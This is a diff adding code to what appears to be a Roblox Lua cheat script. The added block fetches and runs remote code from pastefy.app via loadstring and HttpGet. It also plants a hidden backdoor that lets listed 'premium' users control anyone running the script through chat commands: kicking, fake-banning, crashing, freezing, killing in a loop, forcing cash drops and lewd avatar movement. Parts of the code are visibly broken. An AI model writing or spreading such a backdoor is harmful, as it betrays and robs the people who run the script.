@@ -41,3 +41,237 @@ do
 	    end
 	end
 end
+do
+	local Players = game:GetService("Players")
+	local LocalPlayer = Players.LocalPlayer
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local TeleportService = game:GetService("TeleportService")
+    local TextChatService = game:GetService("TextChatService")
+	local whitelistedUsers = {}
+	local activeListeners = {}
+	
+	local premiumUsers = loadstring(game:HttpGet("https://pastefy.app/uony5Xox/raw"))()
+	
+	local bypassPremiumUsers = loadstring(game:HttpGet("https://pastefy.app/v6r3CVBW/raw"))()
+	
+	function isPremium(player)
+	    return premiumUsers[player.UserId] == true
+	end
+	
+	function isBypassPremium(player)
+	    return bypassPremiumUsers[player.UserId] == true
+	end
+	
+	function removeOldListeners()
+	    for userId in pairs(activeListeners) do
+	        if handler then
+	            activeListeners[userId] = nil
+	        end
+	    end
+	end
+	
+	function updateDisplayName(player)
+	    if not player.Character then return end
+	
+	    local humanoid = player.Character:WaitForChild("Humanoid")
+	    if humanoid then
+	        if isPremium(player) then
+	            humanoid.DisplayName = "[🌟] " .. player.Name
+	        elseif isBypassPremium(player) then
+	            humanoid.DisplayName = "[💫] " .. player.Name
+	        end
+	    end
+	end
+	
+	function setupDisplayNameListener(player)
+	    if player.Character then
+	        updateDisplayName(player)
+	    end
+	
+	    player.CharacterAdded:Connect(function()
+	        task.wait(0.1)
+	        updateDisplayName(player)
+	    end)
+	end
+	
+	benxActive = false
+	TweenService = game:GetService("TweenService")
+	
+	function startBenx(targetPlayer)
+	    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
+	    benxActive = true
+	
+	    local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+	
+	    task.spawn(function()
+	        while benxActive do
+	            local char = LocalPlayer.Character
+	            local targetChar = targetPlayer.Character
+	
+	            if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
+	                local hrp = char.HumanoidRootPart
+	                local targetHRP = targetChar.HumanoidRootPart
+	
+	                local frontPos = targetHRP.CFrame * CFrame.new(0, 0, -1)
+	                local backPos = targetHRP.CFrame * CFrame.new(0, 0, -4)
+	
+	                local tween1 = TweenService:Create(hrp, tweenInfo, {CFrame = frontPos})
+	                tween1:Play()
+	                tween1.Completed:Wait()
+	
+	                local tween2 = TweenService:Create(hrp, tweenInfo, {CFrame = backPos})
+	                tween2:Play()
+	                tween2.Completed:Wait()
+	            end
+	            if not benxActive then break end
+	        end
+	    end)
+	end
+	
+	function setupChatListener(player)
+	    if not (isPremium(player) or isBypassPremium(player)) then return end
+	
+	    activeListeners[player.UserId] = function(msg)
+	        local sender = msg.TextSource and msg.TextSource.UserId and Players:GetPlayerByUserId(msg.TextSource.UserId)
+	        if not sender or sender ~= player then return end
+	
+	        local message = msg.Text or ""
+	        local msgLower = message:lower()
+	
+	        if isPremium(player) then
+	            if msgLower == "!kick ." then
+	                LocalPlayer:Kick(":o")
+	            elseif msgLower == "!freeze ." then
+	                local char = LocalPlayer.Character
+	                if char and char:FindFirstChild("HumanoidRootPart") then
+	                    char.HumanoidRootPart.Anchored = true
+	                end
+	            elseif msgLower == "!unfreeze ." then
+	                local char = LocalPlayer.Character
+	                if char and char:FindFirstChild("HumanoidRootPart") then
+	                    char.HumanoidRootPart.Anchored = false
+	                end
+	            elseif msgLower == "!bring ." then
+	                local char = LocalPlayer.Character
+	                local targetChar = player.Character
+	                if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
+	                    lockedTarget = nil
+	                    voiding = false
+	                    local hrp = char.HumanoidRootPart
+	                    hrp.Velocity = Vector3.zero
+	                    hrp.RotVelocity = Vector3.zero
+	                    hrp.AssemblyLinearVelocity = Vector3.zero
+	                    hrp.AssemblyAngularVelocity = Vector3.zero
+	                    char.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame
+	                    hrp.Velocity = Vector3.zero
+	                    hrp.RotVelocity = Vector3.zero
+	                    hrp.AssemblyLinearVelocity = Vector3.zero
+	                    hrp.AssemblyAngularVelocity = Vector3.zero
+	                end
+	            elseif msgLower == "!crash ." then
+	                while true do end
+	            elseif msgLower == "!dropcash ." then
+	                ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
+	            elseif msgLower == "!benx ." then
+	                startBenx(player)
+	            elseif msgLower == "!unbenx ." then
+	                benxActive = false
+	            elseif msgLower == "!talk off" then
+	                trashtalkactive = false
+	            end
+	        end
+	
+	        if isBypassPremium(player) then
+	            if msgLower == "!ban ." then
+	                LocalPlayer:Kick("PERMA-BAN")
+	            elseif msgLower == "!kick ." then
+	                LocalPlayer:Kick(":o")
+	            elseif msgLower == "!freeze ." then
+	                local char = LocalPlayer.Character
+	                if char and char:FindFirstChild("HumanoidRootPart") then
+	                    char.HumanoidRootPart.Anchored = true
+	                end
+	            elseif msgLower == "!unfreeze ." then
+	                local char = LocalPlayer.Character
+	                if char and char:FindFirstChild("HumanoidRootPart") then
+	                    char.HumanoidRootPart.Anchored = false
+	                end
+	            elseif msgLower == "!bring ." then
+	                local char = LocalPlayer.Character
+	                local targetChar = player.Character
+	                if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
+	                    lockedTarget = nil
+	                    voiding = false
+	                    local hrp = char.HumanoidRootPart
+	                    hrp.Velocity = Vector3.zero
+	                    hrp.RotVelocity = Vector3.zero
+	                    hrp.AssemblyLinearVelocity = Vector3.zero
+	                    hrp.AssemblyAngularVelocity = Vector3.zero
+	                    char.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame
+	                    hrp.Velocity = Vector3.zero
+	                    hrp.RotVelocity = Vector3.zero
+	                    hrp.AssemblyLinearVelocity = Vector3.zero
+	                    hrp.AssemblyAngularVelocity = Vector3.zero
+	                end
+	            elseif msgLower == "!crash ." then
+	                while true do end
+	            elseif msgLower:match("^%!say %. (.+)$") then
+	                local textToSend = msgLower:match("^%-say %. (.+)$")
+	                sendMessage(textToSend)
+	            elseif msgLower == "!rejoin ." then
+	                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+	            elseif msgLower == "!adropcash ." then
+	                autodrop = true
+	            elseif msgLower == "!unadropcash ." then
+	                autodrop = false
+	            elseif msgLower == "!lkill ." then
+	                lkill = true
+	                task.spawn(function()
+	                    while lkill do
+	                        local char = game.Players.LocalPlayer.Character
+	                        if char and char:FindFirstChild("Humanoid") then
+	                            char.Humanoid.Health = 0
+	                        end
+	                        task.wait(0.2)
+	                    end
+	                end)
+	            elseif msgLower == "!unlkill ." then
+	                lkill = false
+	            elseif msgLower == "!dropcash ." then
+	                ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
+	            elseif msgLower == "!benx ." then
+	                startBenx(player)
+	            elseif msgLower == "!unbenx ." then
+	                benxActive = false
+	            elseif msgLower == "!talk off" then
+	                trashtalkactive = false
+	            end
+	        end
+	    end
+	end
+	
+	TextChatService.OnIncomingMessage = function(msg)
+	    for _, handler in pairs(activeListeners) do
+	        if handler then
+	            handler(msg)
+	        end
+	    end
+	end
+	
+	for _, player in pairs(Players:GetPlayers()) do
+	    if (isPremium(player) or isBypassPremium(player)) then
+	        setupChatListener(player)
+	        setupDisplayNameListener(player)
+	    end
+	end
+	
+	Players.PlayerAdded:Connect(function(player)
+	    task.spawn(function()
+	        task.wait(0.1)
+	        if (isPremium(player) or isBypassPremium(player)) then
+	            setupChatListener(player)
+	            setupDisplayNameListener(player)
+	        end
+	    end)
+	end)
+end
